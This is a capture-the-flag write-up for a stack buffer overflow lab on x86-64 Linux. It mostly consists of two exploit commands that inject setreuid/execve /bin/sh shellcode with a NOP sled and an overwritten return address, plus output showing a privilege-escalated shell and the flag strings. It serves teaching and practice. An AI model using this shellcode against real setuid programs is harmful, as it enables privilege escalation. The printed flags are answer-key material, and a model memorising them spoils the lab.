## Description 
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
In this room, we aim to explore simple stack buffer overflows(without any mitigations) on x86-64 linux programs. We will use [radare2](https://github.com/radare/radare2) (r2) to examine the memory layout. You are expected to be familiar with x86 and r2 for this room.

We have included a virtual machine with all the resources to ensure you have the correct environment and tools to follow along. To access the machine via SSH, use the following credentials:

Username: user1 Password: [password omitted]
```

Command for Flag 3 
```bash 
./buffer-overflow $(python -c "print '\x90'*86+'\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x98\xe2\xff\xff\xff\x7f'")
```
   
Output Flag
```bash
[user1@ip-10-10-228-109 overflow-3]$ ls
buffer-overflow  buffer-overflow.c  secret.txt
[user1@ip-10-10-228-109 overflow-3]$  ./buffer-overflow $(python -c "print '\x90'*86+'\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x98\xe2\xff\xff\xff\x7f'")
Here's a program that echo's out your input
��������������������������������������������������������������������������������������1�f��jqXH��j;XH1�I�//bin/shI�APH��RWH��j<XH1�AAAAAAAAAAAA�����
sh-4.2$ cat secret.txt
omgyoudidthissocool!!
```
Got the 3rd Flag
```Flag_3
omgyoudidthissocool!!
```


Command for Flag 4 #Overflow-THM-4-BOF1 

```bash 
./buffer-overflow-2 $(python -c "print('\x90' * 100 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A' * 9 + '\x98\xe2\xff\xff\xff\x7f')")
```

Output and Flag
```bash
[user1@ip-10-10-228-109 overflow-4]$ ./buffer-overflow-2 $(python -c "print('\x90' * 100 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A' * 9 + '\x98\xe2\xff\xff\xff\x7f')")
new word is doggo����������������������������������������������������������������������������������������������������1�f��jqXH��j;XH1�I�//bin/shI�APH��RWH��j<XH1�AAAAAAAAA�����
sh-4.2$ whoami
user3
sh-4.2$ cat secret.txt 
wowanothertime!!
sh-4.2$ 
```

Got the 4th Flag
```flag_4
wowanothertime!!
```